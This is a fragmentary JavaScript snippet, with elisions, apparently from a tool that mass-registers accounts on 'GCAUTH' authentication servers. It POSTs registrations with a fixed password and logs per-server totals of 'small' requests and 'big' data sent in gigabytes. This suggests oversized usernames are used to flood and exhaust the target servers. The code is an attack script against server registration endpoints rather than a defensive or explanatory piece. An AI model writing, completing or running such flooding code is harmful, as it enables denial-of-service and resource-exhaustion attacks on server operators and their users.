...
async function makeAcc(userName, serverAddr, multiplier) {
  const options = {
    method: 'POST',
    url: `https://${serverAddr}/authentication/register`,
    headers: {
      Host: serverAddr,
    ...
    data: {
      username: userName,
      password: 'lanhajuan',
      password_confirmation: "lanhajuan"
    },
  ...
  await http.request(options).then(res => {
    if (res.data.success == true) {
        ...
        let toSend = `[GCAUTH BIG] Success username: ${userName.substring(0,10)} | ${now.getHours()}:${now.getMinutes()}`
...
function printServerStat() {
    stat.forEach((srv) => {
        let now = new Date()
        let formatedString = `[GCAUTH BIG] Srv: ${srv.serverName} | Small: ${srv.smallSent} | Big: ${srv.bigSize.toFixed(3)}GB | At: | ${now.getHours()}:${now.getMinutes()}`
